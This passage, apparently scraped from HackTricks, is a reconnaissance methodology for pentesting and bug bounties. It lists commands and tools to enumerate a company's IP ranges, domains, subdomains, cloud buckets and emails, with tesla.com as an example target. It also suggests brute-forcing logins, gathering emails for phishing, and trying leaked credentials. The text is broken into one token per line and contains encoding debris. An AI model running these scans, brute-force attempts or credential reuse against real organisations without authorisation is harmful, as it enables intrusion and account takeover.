+----------+---------------------+--------------+----------------+----------------------------+-----------+\n[\nINFO\n]\nbbot.modules.asn:\n|\nAS394161\n|\n8.45\n.124.0/24\n|\n3\n|\nTESLA\n|\nTesla Motors, Inc.\n|\nUS\n|\n[\nINFO\n]\nbbot.modules.asn: +----------+---------------------+--------------+----------------+----------------------------+-----------+\n[\nINFO\n]\nbbot.modules.asn:\n|\nAS3356\n|\n8.32\n.0.0/12\n|\n1\n|\nLEVEL3\n|\nLevel\n3\nParent, LLC\n|\nUS\n|\n[\nINFO\n]\nbbot.modules.asn: +----------+---------------------+--------------+----------------+----------------------------+-----------+\n[\nINFO\n]\nbbot.modules.asn:\n|\nAS3356\n|\n8.0\n.0.0/9\n|\n1\n|\nLEVEL3\n|\nLevel\n3\nParent, LLC\n|\nUS\n|\n[\nINFO\n]\nbbot.modules.asn: +----------+---------------------+--------------+----------------+----------------------------+-----------+\n‚Äã\nYou can find the IP ranges of an organisation also using\nhttp://asnlookup.com/\n(it has free API).\nYou can fins the IP and ASN of a domain using\nhttp://ipv4info.com/\n.\nLooking for vulnerabilities\nAt this point we known\nall the assets inside the scope\n, so if you are allowed you could launch some\nvulnerability scanner\n(Nessus, OpenVAS) over all the hosts.\nAlso, you could launch some\nport scans\nor use services like\nshodan\nto find\nopen ports\nand depending on what you find you should\ntake a look in this book to how to pentest several possible services running.\nAlso, It could be worth it to mention that you can also prepare some\ndefault username\nand\npasswords\nlists and try to\nbruteforce services with\nhttps://github.com/x90skysn3k/brutespray\n.\nDomains\nWe know all the companies inside the scope and their assets, it's time to find the domains inside the scope.\nPlease, note that in the following purposed techniques you can also find subdomains and that information shouldn't be underrated.\nFirst of all you should look for the\nmain domain\n(s) of each company. For example, for\nTesla Inc.\nis going to be\ntesla.com\n.\nReverse DNS\nAs you have found all the IP ranges of the domains you could try to perform\nreverse dns lookups\non those\nIPs to find more domains inside the scope\n. Try to use some dns server of the victim or some well-known dns server (1.1.1.1, 8.8.8.8)\ndnsrecon\n-r\n<\nDNS Range\n>\n-n\n<\nIP_DNS\n>\n#DNS reverse of all of the addresses\ndnsrecon\n-d\nfacebook.com\n-r\n157.240\n.221.35/24\n#Using facebooks dns\ndnsrecon\n-r\n157.240\n.221.35/24\n-n\n1.1\n.1.1\n#Using cloudflares dns\ndnsrecon\n-r\n157.240\n.221.35/24\n-n\n8.8\n.8.8\n#Using google dns\nFor this to work, the administrator has to enable manually the PTR.\nYou can also use a online tool for this info:\nhttp://ptrarchive.com/\n‚Äã\nReverse Whois (loop)\nInside a\nwhois\nyou can find a lot of interesting\ninformation\nlike\norganisation name\n,\naddress\n,\nemails\n, phone numbers... But which is even more interesting is that you can find\nmore assets related to the company\nif you perform\nreverse whois lookups by any of those fields\n(for example other whois registries where the same email appears).\nYou can use online tools like:\n‚Äã\nhttps://viewdns.info/reversewhois/\n-\nFree\n‚Äã\nhttps://domaineye.com/reverse-whois\n-\nFree\n‚Äã\nhttps://www.reversewhois.io/\n-\nFree\n‚Äã\nhttps://www.whoxy.com/\n-\nFree\nweb, not free API.\n‚Äã\nhttp://reversewhois.domaintools.com/\n- Not free\n‚Äã\nhttps://drs.whoisxmlapi.com/reverse-whois-search\n- Not Free (only\n100 free\nsearches)\n‚Äã\nhttps://www.domainiq.com/\n- Not Free\nYou can automate this task using\nDomLink\n(requires a whoxy API key).\nYou can also perform some automatic reverse whois discovery with\namass\n:\namass intel -d tesla.com -whois\nNote that you can use this technique to discover more domain names every time you find a new domain.\nTrackers\nIf find the\nsame ID of the same tracker\nin 2 different pages you can suppose that\nboth pages\nare\nmanaged by the same team\n.\nFor example, if you see the same\nGoogle Analytics ID\nor the same\nAdsense ID\non several pages.\nThere are some pages and tools that let you search by these trackers and more:\n‚Äã\nUdon\n‚Äã\n‚Äã\nBuiltWith\n‚Äã\n‚Äã\nSitesleuth\n‚Äã\n‚Äã\nPublicwww\n‚Äã\n‚Äã\nSpyOnWeb\n‚Äã\nFavicon\nDid you know that we can find related domains and sub domains to our target by looking for the same favicon icon hash? This is exactly what\nfavihash.py\ntool made by\n@m4ll0k2\ndoes. Here‚Äôs how to use it:\ncat\nmy_targets.txt\n|\nxargs\n-I\n%%\nbash\n-c\n'echo \"http://%%/favicon.ico\"'\n>\ntargets.txt\npython3 favihash.py\n-f\nhttps://target/favicon.ico\n-t\ntargets.txt\n-s\nfavihash - discover domains with the same favicon icon hash\nSimply said, favihash will allow us to discover domains that have the same favicon icon hash as our target.\nMoreover, you can also search technologies using the favicon hash as explained in\nthis blog post\n. That means that if you know the\nhash of the favicon of a vulnerable version of a web tech\nyou can search if in shodan and\nfind more vulnerable places\n:\nshodan search org:\n\"Target\"\nhttp.favicon.hash:116323821\n--fields\nip_str,port\n--separator\n\" \"\n|\nawk\n'{print $1\":\"$2}'\nThis is how you can\ncalculate the favicon hash\nof a web:\nimport\nmmh3\nimport\nrequests\nimport\ncodecs\n‚Äã\ndef\nfav_hash\n(\nurl\n):\nresponse\n=\nrequests\n.\nget\n(\nurl\n)\nfavicon\n=\ncodecs\n.\nencode\n(\nresponse\n.\ncontent\n,\n\"base64\"\n)\nfhash\n=\nmmh3\n.\nhash\n(\nfavicon\n)\nprint\n(\nf\"\n{\nurl\n}\n:\n{\nfhash\n}\n\"\n)\nreturn\nfhash\nCopyright / Uniq string\nSearch inside the web pages\nstrings that could be shared across different webs in the same organisation\n. The\ncopyright string\ncould be a good example. Then search for that string in\ngoogle\n, in other\nbrowsers\nor even in\nshodan\n:\nshodan search http.html:\"Copyright string\"\nCRT Time\nIt's common to have a cron job such as\n# /etc/crontab\n37\n13\n*/10 * * certbot renew --post-hook\n\"systemctl reload nginx\"\nto renew the all the domain certificates on the server. This means that even if the CA used for this doesn't set the time it was generated in the Validity time, it's possible to\nfind domains belonging to the same company in the certificate transparency logs\n.\nCheck out this\nwriteup for more information\n.\nPassive Takeover\nApparently is common for people to assign subdomains to IPs that belongs to cloud providers and at some point\nlose that IP address but forget about removing the DNS record\n. Therefore, just\nspawning a VM\nin a cloud (like Digital Ocean) you will be actually\ntaking over some subdomains(s)\n.\n‚Äã\nThis post\nexplains a store about it and propose a script that\nspawns a VM in DigitalOcean\n,\ngets\nthe\nIPv4\nof the new machine, and\nsearches in Virustotal for subdomain records\npointing to it.\nOther ways\nNote that you can use this technique to discover more domain names every time you find a new domain.\nShodan\nAs you already know the name of the organisation owning the IP space. You can search by that data in shodan using:\norg:\"Tesla, Inc.\"\nCheck the found hosts for new unexpected domains in the TLS certificate.\nYou could access the\nTLS certificate\nof the main web page, obtain the\nOrganisation name\nand then search for that name inside the\nTLS certificates\nof all the web pages known by\nshodan\nwith the filter :\nssl:\"Tesla Motors\"\nAssetfinder\n‚Äã\nAssetfinder\nis a tool that look for\ndomains related\nwith a main domain and\nsubdomains\nof them, pretty amazing.\nLooking for vulnerabilities\nCheck for some\ndomain takeover\n. Maybe some company is\nusing some a domain\nbut they\nlost the ownership\n. Just register it (if cheap enough) and let know the company.\nIf you find any\ndomain with an IP different\nfrom the ones you already found in the assets discovery, you should perform a\nbasic vulnerability scan\n(using Nessus or OpenVAS) and some\nport scan\nwith\nnmap/masscan/shodan\n. Depending on which services are running you can find in\nthis book some tricks to \"attack\" them\n.\nNote that sometimes the domain is hosted inside an IP that is not controlled by the client, so it's not in the scope, be careful.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nSubdomains\nWe know all the companies inside the scope, all the assets of each company and all the domains related to the companies.\nIt's time to find all the possible subdomains of each found domain.\nDNS\nLet's try to get\nsubdomains\nfrom the\nDNS\nrecords. We should also try for\nZone Transfer\n(If vulnerable, you should report it).\ndnsrecon\n-a\n-d\ntesla.com\nOSINT\nThe fastest way to obtain a lot of subdomains is search in external sources. The most used\ntools\nare the following ones (for better results configure the API keys):\n‚Äã\nBBOT\n‚Äã\n# subdomains\nbbot\n-t\ntesla.com\n-f\nsubdomain-enum\n‚Äã\n# subdomains (passive only)\nbbot\n-t\ntesla.com\n-f\nsubdomain-enum\n-rf\npassive\n‚Äã\n# subdomains + port scan + web screenshots\nbbot\n-t\ntesla.com\n-f\nsubdomain-enum\n-m\nnaabu gowitness\n-n\nmy_scan\n-o\n.\n‚Äã\nAmass\n‚Äã\namass enum\n[\n-active\n]\n[\n-ip\n]\n-d\ntesla.com\namass enum\n-d\ntesla.com\n|\ngrep\ntesla.com\n# To just list subdomains\n‚Äã\nsubfinder\n‚Äã\n# Subfinder, use -silent to only have subdomains in the output\n./subfinder-linux-amd64\n-d\ntesla.com\n[\n-silent\n]\n‚Äã\nfindomain\n‚Äã\n# findomain, use -silent to only have subdomains in the output\n./findomain-linux\n-t\ntesla.com\n[\n--quiet\n]\n‚Äã\nOneForAll\n‚Äã\npython3 oneforall.py\n--target\ntesla.com\n[\n--dns False\n]\n[\n--req False\n]\n[\n--brute False\n]\nrun\n‚Äã\nassetfinder\n‚Äã\nassetfinder --subs-only\n<\ndomain\n>\n‚Äã\nSudomy\n‚Äã\n# It requires that you create a sudomy.api file with API keys\nsudomy\n-d\ntesla.com\n‚Äã\nvita\n‚Äã\nvita -d tesla.com\n‚Äã\ntheHarvester\n‚Äã\ntheHarvester\n-d\ntesla.com\n-b\n\"anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye\"\nThere are\nother interesting tools/APIs\nthat even if not directly specialised in finding subdomains could be useful to find subdomains, like:\n‚Äã\nCrobat\n:\nUses the API\nhttps://sonar.omnisint.io\nto obtain subdomains\n# Get list of subdomains in output from the API\n## This is the API the crobat tool will use\ncurl\nhttps://sonar.omnisint.io/subdomains/tesla.com\n|\njq\n-r\n\".[]\"\n‚Äã\nJLDC free API\n‚Äã\ncurl\nhttps://jldc.me/anubis/subdomains/tesla.com\n|\njq\n-r\n\".[]\"\n‚Äã\nRapidDNS\nfree API\n# Get Domains from rapiddns free API\nrapiddns\n(){\ncurl\n-s\n\"https://rapiddns.io/subdomain/\n$1\n?full=1\"\n\\\n|\ngrep\n-oE\n\"[\\.a-zA-Z0-9-]+\\.\n$1\n\"\n\\\n|\nsort\n-u\n}\nrapiddns tesla.com\n‚Äã\nhttps://crt.sh/\n‚Äã\n# Get Domains from crt free API\ncrt\n(){\ncurl\n-s\n\"https://crt.sh/?q=%25.\n$1\n\"\n\\\n|\ngrep\n-oE\n\"[\\.a-zA-Z0-9-]+\\.\n$1\n\"\n\\\n|\nsort\n-u\n}\ncrt tesla.com\n‚Äã\ngau\n:\nfetches known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, and Common Crawl for any given domain.\n# Get subdomains from GAUs found URLs\ngau\n--subs\ntesla.com\n|\ncut\n-d\n\"/\"\n-f\n3\n|\nsort\n-u\n‚Äã\nSubDomainizer\n&\nsubscraper\n: They scrap the web looking for JS files and extract subdomains from there.\n# Get only subdomains from SubDomainizer\npython3 SubDomainizer.py\n-u\nhttps://tesla.com\n|\ngrep\ntesla.com\n‚Äã\n# Get only subdomains from subscraper, this already perform recursion over the found results\npython subscraper.py\n-u\ntesla.com\n|\ngrep\ntesla.com\n|\ncut\n-d\n\" \"\n-f\n‚Äã\nShodan\n‚Äã\n# Get info about the domain\nshodan domain\n<\ndomain\n>\n# Get other pages with links to subdomains\nshodan search\n\"http.html:help.domain.com\"\n‚Äã\nCensys subdomain finder\n‚Äã\nexport CENSYS_API_ID=...\nexport CENSYS_API_SECRET=...\npython3 censys-subdomain-finder.py tesla.com\n‚Äã\nsecuritytrails.com\nhas a free API to search for subdomains and IP history\n‚Äã\nchaos.projectdiscovery.io\n‚Äã\nThis project offers for\nfree all the subdomains related to bug-bounty programs\n. You can access this data also using\nchaospy\nor even access the scope used by this project\nhttps://github.com/projectdiscovery/chaos-public-program-list\n‚Äã\nYou can find a\ncomparison\nof many of these tools here:\nhttps://blog.blacklanternsecurity.com/p/subdomain-enumeration-tool-face-off\n‚Äã\nDNS Brute force\nLet's try to find new\nsubdomains\nbrute-forcing DNS servers using possible subdomain names.\nFor this action you will need some\ncommon subdomains wordlists like\n:\n‚Äã\nhttps://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056\n‚Äã\n‚Äã\nhttps://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt\n‚Äã\n‚Äã\nhttps://localdomain.pw/subdomain-bruteforce-list/all.txt.zip\n‚Äã\n‚Äã\nhttps://github.com/pentester-io/commonspeak\n‚Äã\n‚Äã\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS\n‚Äã\nAnd also IPs of good DNS resolvers. In order to generate a list of trusted DNS resolvers you can download the resolvers from\nhttps://public-dns.info/nameservers-all.txt\nand use\ndnsvalidator\nto filter them. Or you could use:\nhttps://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt\n‚Äã\nThe most recommended tools for DNS brute-force are:\n‚Äã\nmassdns\n: This was the first tool that performed an effective DNS brute-force. It's very fast however it's prone to false positives.\nsed\n's/$/.domain.com/'\nsubdomains.txt\n>\nbf-subdomains.txt\n./massdns\n-r\nresolvers.txt\n-w\n/tmp/results.txt bf-subdomains.txt\ngrep\n-E\n\"tesla.com. [0-9]+ IN A .+\"\n/tmp/results.txt\n‚Äã\ngobuster\n: This one I think just uses 1 resolver\ngobuster dns -d mysite.com -t 50 -w subdomains.txt\n‚Äã\nshuffledns\nis a wrapper around\nmassdns\n, written in go, that allows you to enumerate valid subdomains using active bruteforce, as well as resolve subdomains with wildcard handling and easy input-output support.\nshuffledns -d example.com -list example-subdomains.txt -r resolvers.txt\n‚Äã\npuredns\n: It also uses\nmassdns\n.\npuredns bruteforce all.txt domain.com\n‚Äã\naiodnsbrute\nuses asyncio to brute force domain names asynchronously.\naiodnsbrute -r resolvers -w wordlist.txt -vv -t 1024 domain.com\nSecond DNS Brute-Force Round\nAfter having found subdomains using open sources and brute-forcing, you could generate alterations of the subdomains found to try to find even more. Several tools are useful for this purpose:\n‚Äã\ndnsgen\n:\nGiven the domains and subdomains generate permutations.\ncat\nsubdomains.txt\n|\ndnsgen -\n‚Äã\ngoaltdns\n: Given the domains and subdomains generate permutations.\nYou can get goaltdns permutations\nwordlist\nin\nhere\n.\ngoaltdns\n-l\nsubdomains.txt\n-w\n/tmp/words-permutations.txt\n-o\n/tmp/final-words-s3.txt\n‚Äã\ngotator\n:\nGiven the domains and subdomains generate permutations. If not permutations file is indicated gotator will use its own one.\ngotator -sub subdomains.txt -silent [-perm /tmp/words-permutations.txt]\n‚Äã\naltdns\n: Apart from generating subdomains permutations, it can also try to resolve them (but it's better to use the previous commented tools).\nYou can get altdns permutations\nwordlist\nin\nhere\n.\naltdns -i subdomains.txt -w /tmp/words-permutations.txt -o /tmp/asd3\n‚Äã\ndmut\n: Another tool to perform permutations, mutations and alteration of subdomains. This tool will brute force the result (it doesn't support dns wild card).\nYou can get dmut permutations wordlist in\nhere\n.\ncat\nsubdomains.txt\n|\ndmut\n-d\n/tmp/words-permutations.txt\n-w\n100\n\\\n--dns-errorLimit\n10\n--use-pb\n--verbose\n-s\n/tmp/resolvers-trusted.txt\n‚Äã\nalterx\n:\nBased on a domain it\ngenerates new potential subdomains names\nbased on indicated patterns to try to discover more subdomains.\nSmart permutations generation\n‚Äã\nregulator\n: For more info read this\npost\nbut it will basically get the\nmain parts\nfrom the\ndiscovered subdomains\nand will mix them to find more subdomains.\npython3 main.py adobe.com adobe adobe.rules\nmake_brute_list.sh adobe.rules adobe.brute\npuredns resolve adobe.brute\n--write\nadobe.valid\n‚Äã\nsubzuf\n:\nsubzuf\nis a subdomain brute-force fuzzer coupled with an immensly simple but effective DNS reponse-guided algorithm. It utilizes a provided set of input data, like a tailored wordlist or historical DNS/TLS records, to accurately synthesize more corresponding domain names and expand them even further in a loop based on information gathered during DNS scan.\necho www | subzuf facebook.com\nSubdomain Discovery Workflow\nCheck this blog post I wrote about how to\nautomate the subdomain discovery\nfrom a domain using\nTrickest workflows\nso I don't need to launch manually a bunch of tools in my computer:\nFull Subdomain Discovery Using Automated Trickest Workflow - Part 1 | Trickest\nTrickest\nFull Subdomain Brute Force Discovery Using Automated Trickest Workflow - Part 2 | Trickest\nTrickest\nVHosts / Virtual Hosts\nIf you found an IP address containing\none or several web pages\nbelonging to subdomains, you could try to\nfind other subdomains with webs in that IP\nby looking in\nOSINT sources\nfor domains in an IP or by\nbrute-forcing VHost domain names in that IP\n.\nOSINT\nYou can find some\nVHosts in IPs using\nHostHunter\nor other APIs\n.\nBrute Force\nIf you suspect that some subdomain can be hidden in a web server you could try to brute force it:\nffuf\n-c\n-w\n/path/to/wordlist\n-u\nhttp://victim.com\n-H\n\"Host: FUZZ.victim.com\"\n‚Äã\ngobuster vhost\n-u\nhttps://mysite.com\n-t\n50\n-w\nsubdomains.txt\n‚Äã\nwfuzz\n-c\n-w\n/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt\n--hc\n400,404\n,403\n-H\n\"Host: FUZZ.example.com\"\n-u\nhttp://example.com\n-t\n100\n‚Äã\n#From https://github.com/allyshka/vhostbrute\nvhostbrute.py\n--url\n=\n\"example.com\"\n--remoteip\n=\n\"10.1.1.15\"\n--base\n=\n\"www.example.com\"\n--vhosts\n=\n\"vhosts_full.list\"\n‚Äã\n#https://github.com/codingo/VHostScan\nVHostScan\n-t\nexample.com\nWith this technique you may even be able to access internal/hidden endpoints.\nCORS Brute Force\nSometimes you will find pages that only return the header\nAccess-Control-Allow-Origin\nwhen a valid domain/subdomain is set in the\nOrigin\nheader. In these scenarios, you can abuse this behaviour to\ndiscover\nnew\nsubdomains\n.\nffuf\n-w\nsubdomains-top1million-5000.txt\n-u\nhttp://10.10.10.208\n-H\n'Origin: http://FUZZ.crossfit.htb'\n-mr\n\"Access-Control-Allow-Origin\"\n-ignore-body\nBuckets Brute Force\nWhile looking for\nsubdomains\nkeep an eye to see if it is\npointing\nto any type of\nbucket\n, and in that case\ncheck the permissions\n.\nAlso, as at this point you will know all the domains inside the scope, try to\nbrute force possible bucket names and check the permissions\n.\nMonitorization\nYou can\nmonitor\nif\nnew subdomains\nof a domain are created by monitoring the\nCertificate Transparency\nLogs\nsublert\ndoes.\nLooking for vulnerabilities\nCheck for possible\nsubdomain takeovers\n.\nIf the\nsubdomain\nis pointing to some\nS3 bucket\n,\ncheck the permissions\n.\nIf you find any\nsubdomain with an IP different\nfrom the ones you already found in the assets discovery, you should perform a\nbasic vulnerability scan\n(using Nessus or OpenVAS) and some\nport scan\nwith\nnmap/masscan/shodan\n. Depending on which services are running you can find in\nthis book some tricks to \"attack\" them\n.\nNote that sometimes the subdomain is hosted inside an IP that is not controlled by the client, so it's not in the scope, be careful.\nIPs\nIn the initial steps you might have\nfound some IP ranges, domains and subdomains\n.\nIt‚Äôs time to\nrecollect all the IPs from those ranges\nand for the\ndomains/subdomains (DNS queries).\nUsing services from the following\nfree apis\nyou can also find\nprevious IPs used by domains and subdomains\n. These IPs might still be owned by the client (and might allow you to find\nCloudFlare bypasses\n)\n‚Äã\nhttps://securitytrails.com/\n‚Äã\nLooking for vulnerabilities\nPort scan all the IPs that doesn‚Äôt belong to CDNs\n(as you highly probably won‚Äôt find anything interested in there). In the running services discovered you might be\nable to find vulnerabilities\n.\nFind a\nguide\nabout how to scan hosts.\nWeb servers hunting\nWe have found all the companies and their assets and we know IP ranges, domains and subdomains inside the scope. It's time to search for web servers.\nIn the previous steps you have probably already performed some\nrecon of the IPs and domains discovered\n, so you may have\nalready found all the possible web servers\n. However, if you haven't we are now going to see some\nfast tricks to search for web servers\ninside the scope.\nPlease, note that this will be\noriented for web apps discovery\n, so you should\nperform the vulnerability\nand\nport scanning\nalso (\nif allowed\nby the scope).\nA\nfast method\nto discover\nports open\nrelated to\nweb\nservers using\nmasscan\ncan be found here\n.\nAnother friendly tool to look for web servers is\nhttprobe\n,\nfprobe\nand\nhttpx\n. You just pass a list of domains and it will try to connect to port 80 (http) and 443 (https). Additionally, you can indicate to try other ports:\ncat\n/tmp/domains.txt\n|\nhttprobe\n#Test all domains inside the file for port 80 and 443\ncat\n/tmp/domains.txt\n|\nhttprobe\n-p\nhttp:8080\n-p\nhttps:8443\n#Check port 80, 443 and 8080 and 8443\nScreenshots\nNow that you have discovered\nall the web servers\npresent in the scope (among the\nIPs\nof the company and all the\ndomains\nand\nsubdomains\n) you probably\ndon't know where to start\n. So, let's make it simple and start just taking screenshots of all of them. Just by\ntaking a look\nat the\nmain page\nyou can find\nweird\nendpoints that are more\nprone\nto be\nvulnerable\n.\nTo perform the proposed idea you can use\nEyeWitness\n,\nHttpScreenshot\n,\nAquatone\n,\nShutter\nor\nwebscreenshot\n.\nMoreover, you could then use\neyeballer\nto run over all the\nscreenshots\nto tell you\nwhat's likely to contain vulnerabilities\n, and what isn't.\nPublic Cloud Assets\nIn order to find potential cloud assets belonging to a company you should\nstart with a list of keywords that identify that company\n. For example, a crypto for a crypto company you might use words such as:\n\"crypto\", \"wallet\", \"dao\", \"<domain_name>\", <\"subdomain_names\">\n.\nYou will also need wordlists of\ncommon words used in buckets\n:\n‚Äã\nhttps://raw.githubusercontent.com/cujanovic/goaltdns/master/words.txt\n‚Äã\n‚Äã\nhttps://raw.githubusercontent.com/infosec-au/altdns/master/words.txt\n‚Äã\n‚Äã\nhttps://raw.githubusercontent.com/jordanpotti/AWSBucketDump/master/BucketNames.txt\n‚Äã\nThen, with those words you should generate\npermutations\n(check the\nSecond Round DNS Brute-Force\nfor more info).\nWith the resulting wordlists you could use tools such as\ncloud_enum\n,\nCloudScraper\n,\ncloudlist\nor\nS3Scanner\n.\nRemember that when looking for Cloud Assets you should l\nook for more than just buckets in AWS\n.\nLooking for vulnerabilities\nIf you find things such as\nopen buckets or cloud functions exposed\nyou should\naccess them\nand try to see what they offer you and if you can abuse them.\nEmails\nWith the\ndomains\nand\nsubdomains\ninside the scope you basically have all what you\nneed to start searching for emails\n. These are the\nAPIs\nand\ntools\nthat have worked the best for me to find emails of a company:\n‚Äã\ntheHarvester\n- with APIs\nAPI of\nhttps://hunter.io/\n(free version)\nAPI of\nhttps://app.snov.io/\n(free version)\nAPI of\nhttps://minelead.io/\n(free version)\nLooking for vulnerabilities\nEmails will come handy later to\nbrute-force web logins and auth services\n(such as SSH). Also, they are needed for\nphishings\n. Moreover, these APIs will give you even more\ninfo about the person\nbehind the email, which is useful for the phishing campaign.\nCredential Leaks\nWith the\ndomains,\nsubdomains\n, and\nemails\nyou can start looking for credentials leaked in the past belonging to those emails:\n‚Äã\nhttps://leak-lookup.com\n‚Äã\n‚Äã\nhttps://www.dehashed.com/\n‚Äã\nLooking for vulnerabilities\nIf you find\nvalid leaked\ncredentials, this is a very easy win.\nSecrets Leaks\nCredential leaks are related to hacks of companies where\nsensitive information was leaked and sold\n. However, companies might be affected for\nother leaks\nwhose info isn't in those databases:\nGithub Leaks\nCredentials and APIs might be leaked in the\npublic repositories\nof the\ncompany\nor of the\nusers\nworking by that github company.\nYou can use the\ntool\nLeakos\nto\ndownload\nall the\npublic repos\nof an\norganization\nand of its\ndevelopers\nand run\ngitleaks\nover them automatically.\nLeakos\ncan also be used to run\ngitleaks\nagains all the\ntext\nprovided\nURLs passed\nto it as sometimes\nweb pages also contains secrets\n.\nGithub Dorks\nCheck also this\npage\nfor potential\ngithub dorks\nyou could also search for in the organization you are attacking:\nGithub Dorks & Leaks\nPastes Leaks\nSometimes attackers or just workers will\npublish company content in a paste site\n. This might or might not contain\nsensitive information\n, but it's very interesting to search for it.\nYou can use the tool\nPastos\nto search in more that 80 paste sites at the same time.\nGoogle Dorks\nOld but gold google dorks are always useful to find\nexposed information that shouldn't be there\n. The only problem is that the\ngoogle-hacking-database\ncontains several\nthousands\nof possible queries that you cannot run manually. So, you can get your favourite 10 ones or you could use a\ntool such as\nGorks\nto run them all\n.\nNote that the tools that expect to run all the database using the regular Google browser will never end as google will block you very very soon.\nLooking for vulnerabilities\nIf you find\nvalid leaked\ncredentials or API tokens, this is a very easy win.\nPublic Code Vulnerabilities\nIf you found that the company has\nopen-source code\nyou can\nanalyse\nit and search for\nvulnerabilities\non it.\nDepending on the language\nthere are different\ntools\nyou can use:\nSource code Review / SAST Tools\nThere are also free services that allow you to\nscan public repositories\n, such as:\n‚Äã\nSnyk\n‚Äã\n‚Äã\nPentesting Web Methodology\n‚Äã\nThe\nmajority of the vulnerabilities\nfound by bug hunters resides inside\nweb applications\n, so at this point I would like to talk about a\nweb application testing methodology\n, and you can\nfind this information here\n.\nI also want to do a special mention to the section\nWeb Automated Scanners open source tools\n, as, if you shouldn't expect them to find you very sensitive vulnerabilities, they come handy to implement them on\nworkflows to have some initial web information.\nRecapitulation\nCongratulations! At this point you have already perform\nall the basic enumeration\n. Yes, it's basic because a lot more enumeration can be done (will see more tricks later).\nSo you have already:\n1.\nFound all the\ncompanies\ninside the scope\n2.\nFound all the\nassets\nbelonging to the companies (and perform some vuln scan if in scope)\n3.\nFound all the\ndomains\nbelonging to the companies\n4.\nFound all the\nsubdomains\nof the domains (any subdomain takeover?)\n5.\nFound all the\nIPs\n(from and\nnot from CDNs\n) inside the scope.\n6.\nFound all the\nweb servers\nand took a\nscreenshot\nof them (anything weird worth a deeper look?)\n7.\nFound all the\npotential public cloud assets\nbelonging to the company.\n8.\nEmails\n,\ncredentials leaks\n, and\nsecret leaks\nthat could give you a\nbig win very easily\n.\n9.\nPentesting all the webs you found\nFull Recon Automatic Tools\nThere are several tools out there that will perform part of the proposed actions against a given scope.\n‚Äã\nhttps://github.com/yogeshojha/rengine\n‚Äã\n‚Äã\nhttps://github.com/j3ssie/Osmedeus\n‚Äã\n‚Äã\nhttps://github.com/six2dez/reconftw\n‚Äã\n‚Äã\nhttps://github.com/hackerspider1/EchoPwn\n- A little old and not updated\nReferences\nAll free courses of\n@Jhaddix\n(like\nThe Bug Hunter's Methodology v4.0 - Recon Edition\n)\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nGeneric Methodologies & Resources -\nPrevious\nPentesting Methodology\nNext\nWide Source Code Search\nLast modified\n3mo ago"
    },
    {
        "title": "Pentesting Network",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network",
        "text": "Pentesting Network\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nDiscovering hosts from the outside\nThis is going to be a\nbrief section\nabout how to find\nIPs responding\nfrom the\nInternet\n.\nIn this situation you have some\nscope of IPs\n(maybe even several\nranges\n) and you just to find\nwhich IPs are responding\n.\nICMP\nThis is the\neasiest\nand\nfastest\nway to discover if a host is up or not.\nYou could try to send some\nICMP\npackets and\nexpect responses\n. The easiest way is just sending an\necho request\nand expect from the response. You can do that using a simple\nping\nor using\nfping\nfor\nranges\n.\nYou could also use\nnmap\nto send other types of ICMP packets (this will avoid filters to common ICMP echo request-response).\nping\n-c\n1\n199.66\n.11.4\n# 1 echo request to a host\nfping\n-g\n199.66\n.11.0/24\n# Send echo requests to ranges\nnmap\n-PE\n-PM\n-PP\n-sn\n-n\n199.66\n.11.0/24\n#Send echo, timestamp requests and subnet mask requests\nTCP Port Discovery\nIt's very common to find that all kind of ICMP packets are being filtered. Then, all you can do to check if a host is up is\ntry to find open ports\n. Each host has\n65535 ports\n, so, if you have a \"big\" scope you\ncannot\ntest if\neach port\nof each host is 